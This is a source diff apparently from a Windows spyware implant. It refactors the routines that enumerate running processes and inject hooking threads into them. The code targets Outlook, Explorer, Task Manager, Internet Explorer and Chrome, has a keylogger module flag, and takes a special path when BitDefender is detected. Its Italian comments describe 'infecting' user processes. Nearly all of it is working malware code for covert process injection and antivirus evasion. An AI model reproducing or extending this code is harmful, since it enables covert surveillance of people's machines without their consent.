@@ -52,6 +52,7 @@
 #include "config.h"
 #include <rcs/strings.h>
 #include  <scramblestring.h>
+#include <rcs/enumprocess.h>
 
 // modules
 #ifdef __ENABLE_KEYLOG_MODULE
@@ -1902,8 +1903,6 @@ DWORD WINAPI InjectServiceThread(DWORD dummy)
 // tranne che nel processo chiamante
 BOOL HM_HookActiveProcesses()
 {
-	HANDLE hProcessSnap;
-	PROCESSENTRY32 pe32;
 	DWORD dwCallingPid;
 	DWORD integrity_level;
 	DWORD dummy;
@@ -1914,24 +1913,21 @@ BOOL HM_HookActiveProcesses()
 		HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InjectServiceThread, NULL, 0, &dummy);		
 
 	// Continua con l'infection dei processi utente
-	pe32.dwSize = sizeof( PROCESSENTRY32 );
 	dwCallingPid = FNC(GetCurrentProcessId)();
-	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
-		return FALSE;
 
-	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
-		CloseHandle( hProcessSnap );
-		return FALSE;
+	EnumerateProcess enumProcess;
+
+	while (enumProcess()) {
+		DWORD th32ProcessID = (*enumProcess)->th32ProcessID;
+
+		if (th32ProcessID == dwCallingPid)
+			continue;
+
+		if (IsMyProcess(th32ProcessID) == FALSE)
+			continue;
+
+		HM_sStartHookingThread(th32ProcessID, NULL, TRUE, TRUE);
 	}
-
-	// Cicla la lista dei processi attivi
-	do {
-		// Effettua l'hook solo se il processo non e' il chiamante
-		if (pe32.th32ProcessID != dwCallingPid && IsMyProcess(pe32.th32ProcessID))
-			HM_sStartHookingThread(pe32.th32ProcessID, NULL, TRUE, TRUE);
-	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
-
-	CloseHandle( hProcessSnap );
 	return TRUE ;
 }
 
@@ -1964,29 +1960,23 @@ DWORD WINAPI PollNewApps(DWORD dummy)
 {
 	char* polled_name[PROCESS_POLLED] = { "taskmgr.exe", "outlook.exe", "explorer.exe", "mghtml.exe", "iexplore.exe", "chrome.exe" };
 	DWORD i, loop_count = 0;
-	HANDLE hProcessSnap;
-	PROCESSENTRY32 pe32;
 	char *name_offs;
 	BOOL infected;
 
-	LOOP {
+	LOOP{
 		Sleep(HM_PTSLEEPTIME);
 		loop_count++;
 
-		pe32.dwSize = sizeof( PROCESSENTRY32 );
-		if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE ) 
-			continue;
-		if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
-			CloseHandle( hProcessSnap );
-			continue;
-		}
-		// Cicla la lista dei processi attivi
-		do {
+		EnumerateProcess pslist;
+
+		while (pslist()) {	// iterate in process list
+			PROCESSENTRY32* pe32 = *pslist;
+
 			infected = FALSE;
 			// Elimina il path
-			name_offs = strrchr(pe32.szExeFile, '\\');
+			name_offs = strrchr(pe32->szExeFile, '\\');
 			if (!name_offs)
-				name_offs = pe32.szExeFile;
+				name_offs = pe32->szExeFile;
 			else
 				name_offs++;
 
@@ -1995,20 +1985,21 @@ DWORD WINAPI PollNewApps(DWORD dummy)
 				continue;
 
 			// Confronta il nome con quelli da pollare
-			if ((loop_count%3) == 0) {
-				for (i=0; i<PROCESS_POLLED; i++) {
-					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32.th32ProcessID)) {
+			if ((loop_count % 3) == 0) {
+				for (i = 0; i < PROCESS_POLLED; i++) {
+					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32->th32ProcessID)) {
 						// Se e' fra quelli lo inietta (HM_sStartHookingThread lo fara' solo la prima volta)
-						HM_sStartHookingThread(pe32.th32ProcessID, NULL, FALSE, TRUE);
+						HM_sStartHookingThread(pe32->th32ProcessID, NULL, FALSE, TRUE);
 						infected = TRUE;
 						break;
 					}
 				}
-			} else {
-				for (i=0; i<PROCESS_FREQUENTLY_POLLED; i++) {
-					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32.th32ProcessID)) {
+			}
+			else {
+				for (i = 0; i < PROCESS_FREQUENTLY_POLLED; i++) {
+					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32->th32ProcessID)) {
 						// Se e' fra quelli lo inietta (HM_sStartHookingThread lo fara' solo la prima volta)
-						HM_sStartHookingThread(pe32.th32ProcessID, NULL, FALSE, TRUE);
+						HM_sStartHookingThread(pe32->th32ProcessID, NULL, FALSE, TRUE);
 						infected = TRUE;
 						break;
 					}
@@ -2021,11 +2012,10 @@ DWORD WINAPI PollNewApps(DWORD dummy)
 			// Guarda i bypass, marca i processi hookati
 			if (!infected && (IsX64System() || IsBitDefender())) {
 				DWORD dwCallingPid = FNC(GetCurrentProcessId)();
-				if (pe32.th32ProcessID != dwCallingPid && !IsX64Process(pe32.th32ProcessID) && IsMyProcess(pe32.th32ProcessID) )
-					HM_sStartHookingThread(pe32.th32ProcessID, NULL, TRUE, TRUE);	
+				if (pe32->th32ProcessID != dwCallingPid && !IsX64Process(pe32->th32ProcessID) && IsMyProcess(pe32->th32ProcessID))
+					HM_sStartHookingThread(pe32->th32ProcessID, NULL, TRUE, TRUE);
 			}
-		} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
-		CloseHandle( hProcessSnap );
+		}
 	}
 }
 
@@ -2039,7 +2029,6 @@ void HM_StartPolling(void)
 		HANDLE_SENT_MESSAGES(msg, 100);
 	}
 }
-
 
 BOOL FindModulePath(char *path_buf, DWORD path_size)
 {
